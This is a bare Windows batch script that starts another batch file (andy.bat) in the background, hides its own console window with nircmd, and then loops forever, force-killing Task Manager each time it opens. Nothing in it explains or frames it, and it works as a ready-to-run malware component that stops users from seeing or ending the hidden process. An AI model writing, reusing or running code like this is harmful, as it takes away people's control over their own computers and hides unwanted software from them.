@echo off
start /b andy.bat
nircmd win hide title "C:\Windows\system32\cmd.exe"
:loop
tasklist /FI "IMAGENAME eq taskmgr.exe" 2>NUL | find /I /N "taskmgr.exe">NUL
if "%ERRORLEVEL%"=="0" taskkill /im taskmgr.exe /f
goto loop